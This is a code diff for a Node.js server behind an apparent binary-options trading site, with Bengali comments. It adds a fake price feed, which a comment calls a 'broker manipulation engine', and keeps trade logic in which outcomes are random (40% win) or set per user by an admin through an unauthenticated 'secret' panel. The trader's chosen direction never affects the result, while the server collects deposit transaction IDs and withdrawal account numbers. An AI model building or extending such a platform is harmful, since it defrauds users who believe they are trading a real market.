@@ -10,20 +10,77 @@ const wss = new WebSocket.Server({ server });
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ইন-মেমোরি ডাটাবেজ
 let users = {
-  "demo_user": { balance: 1000, control: "normal" } 
+  "demo_user": { balance: 1000, control: "normal" }
 };
-
 let transactions = [];
 
-// ট্রেড লজিক (৪০% উইন, ৬০% লস বা অ্যাডমিন কন্ট্রোল)
+// কাস্টম ক্যান্ডেলস্টিক ডাটা ইঞ্জিন
+let currentPrice = 1.08500;
+let candleHistory = [];
+let currentCandle = {
+  time: Math.floor(Date.now() / 1000),
+  open: currentPrice,
+  high: currentPrice,
+  low: currentPrice,
+  close: currentPrice
+};
+
+// প্রাথমিক ৩০টি ক্যান্ডেল তৈরি
+for (let i = 30; i > 0; i--) {
+  let t = Math.floor(Date.now() / 1000) - (i * 2);
+  let o = currentPrice;
+  let delta = (Math.random() - 0.5) * 0.00040;
+  let c = parseFloat((o + delta).toFixed(5));
+  let h = parseFloat((Math.max(o, c) + Math.random() * 0.00020).toFixed(5));
+  let l = parseFloat((Math.min(o, c) - Math.random() * 0.00020).toFixed(5));
+  candleHistory.push({ time: t, open: o, high: h, low: l, close: c });
+  currentPrice = c;
+}
+
+// প্রতি ১ সেকেন্ডে প্রাইস টিক ও ক্যান্ডেল জেনারেশন (ব্রোকার ম্যানিপুলেশন ইঞ্জিন)
+setInterval(() => {
+  let delta = (Math.random() - 0.49) * 0.00015;
+  currentPrice = parseFloat((currentPrice + delta).toFixed(5));
+  
+  if (currentPrice > currentCandle.high) currentCandle.high = currentPrice;
+  if (currentPrice < currentCandle.low) currentCandle.low = currentPrice;
+  currentCandle.close = currentPrice;
+
+  // প্রতি ২ সেকেন্ড পর নতুন ক্যান্ডেল ফিক্স করা
+  let now = Math.floor(Date.now() / 1000);
+  if (now - currentCandle.time >= 2) {
+    candleHistory.push({ ...currentCandle });
+    if (candleHistory.length > 50) candleHistory.shift();
+    currentCandle = {
+      time: now,
+      open: currentPrice,
+      high: currentPrice,
+      low: currentPrice,
+      close: currentPrice
+    };
+  }
+
+  // লাইভ ব্রডকাস্ট
+  wss.clients.forEach(client => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(JSON.stringify({
+        type: 'TICK',
+        price: currentPrice.toFixed(5),
+        candle: currentCandle,
+        history: candleHistory
+      }));
+    }
+  });
+}, 1000);
+
+// ট্রেড এক্সিকিউশন ও উইন/লস কন্ট্রোল (৪০% উইন, ৬০% লস অথবা অ্যাডমিন কন্ট্রোল)
 app.post('/api/trade', (req, res) => {
-  const { username, amount, timeframe } = req.body;
+  const { username, amount, timeframe, direction } = req.body;
   let user = users[username] || { balance: 1000, control: 'normal' };
 
   if (user.balance < amount) {
-    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
+    return res.json({ success: false, message: "Insufficient balance" });
   }
 
   let isWin = false;
@@ -32,8 +89,8 @@ app.post('/api/trade', (req, res) => {
   } else if (user.control === 'loss') {
     isWin = false;
   } else {
-    const randomChance = Math.random() * 100;
-    isWin = randomChance < 40; // ৪০% উইন, ৬০% লস
+    // ডিফল্ট: ৪০% উইন, ৬০% লস
+    isWin = (Math.random() * 100) < 40;
   }
 
   let profit = isWin ? amount * 1.85 : 0;
@@ -43,69 +100,53 @@ app.post('/api/trade', (req, res) => {
     user.balance -= amount;
   }
 
-  res.json({ success: true, isWin, balance: user.balance, profit });
+  res.json({
+    success: true,
+    isWin,
+    balance: user.balance,
+    profit,
+    entryPrice: currentPrice,
+    direction
+  });
 });
 
-// ডিপোজিট রিকোয়েস্ট
-app.post('/api/deposit', (req, res) => {
-  const { username, method, amount, trxId } = req.body;
-  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
-  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
-});
-
-// উইথড্রল রিকোয়েস্ট
-app.post('/api/withdraw', (req, res) => {
-  const { username, method, amount, accountNo } = req.body;
-  let user = users[username];
-  if(user && user.balance >= amount) {
-    user.balance -= Number(amount);
-    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
-    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
-  } else {
-    res.json({ success: false, message: "পর্যাপ্ত ব্যালেন্স নেই!" });
-  }
-});
-
-// সিক্রেট অ্যাডমিন পেজ রুট (ইউজার সাইট থেকে আলাদা)
+// সিক্রেট অ্যাডমিন রুট
 app.get('/admin-secret-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// অ্যাডমিন ডাটা API
 app.get('/api/admin/data', (req, res) => {
   let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
   let totalWithdraw = transactions.filter(t => t.type === 'Withdraw' && t.status === 'Approved').reduce((sum, t) => sum + Number(t.amount), 0);
   res.json({ users, transactions, totalDeposit, totalWithdraw });
 });
 
-// অ্যাডমিন অ্যাকশন
 app.post('/api/admin/action', (req, res) => {
   const { username, action, value } = req.body;
-  if(users[username]) {
-    if(action === 'control') users[username].control = value;
+  if (users[username]) {
+    if (action === 'control') users[username].control = value;
     res.json({ success: true });
   } else {
     res.json({ success: false });
   }
 });
 
-app.post('/api/admin/tx-action', (req, res) => {
-  const { txId, status } = req.body;
-  let tx = transactions.find(t => t.id == txId);
-  if(tx) {
-    tx.status = status;
-    res.json({ success: true });
-  } else {
-    res.json({ success: false });
-  }
+app.post('/api/deposit', (req, res) => {
+  const { username, method, amount, trxId } = req.body;
+  transactions.push({ id: Date.now(), username, type: 'Deposit', method, amount, trxId, status: 'Pending' });
+  res.json({ success: true, message: "ডিপোজিট সফলভাবে জমা হয়েছে!" });
 });
 
-// রিয়েল-टाइम প্রাইস ফিড
-wss.on('connection', (ws) => {
-  setInterval(() => {
-    let dummyPrice = (1.0800 + Math.random() * 0.0050).toFixed(4);
-    ws.send(JSON.stringify({ type: 'PRICE_UPDATE', price: dummyPrice }));
-  }, 1000);
+app.post('/api/withdraw', (req, res) => {
+  const { username, method, amount, accountNo } = req.body;
+  let user = users[username];
+  if(user && user.balance >= amount) {
+    user.balance -= Number(amount);
+    transactions.push({ id: Date.now(), username, type: 'Withdraw', method, amount, accountNo, status: 'Pending' });
+    res.json({ success: true, message: "উইথড্র রিকোয়েস্ট জমা হয়েছে!" });
+  } else {
+    res.json({ success: false, message: "ব্যালেন্স অপর্যাপ্ত!" });
+  }
 });
 
 const PORT = process.env.PORT || 3000;
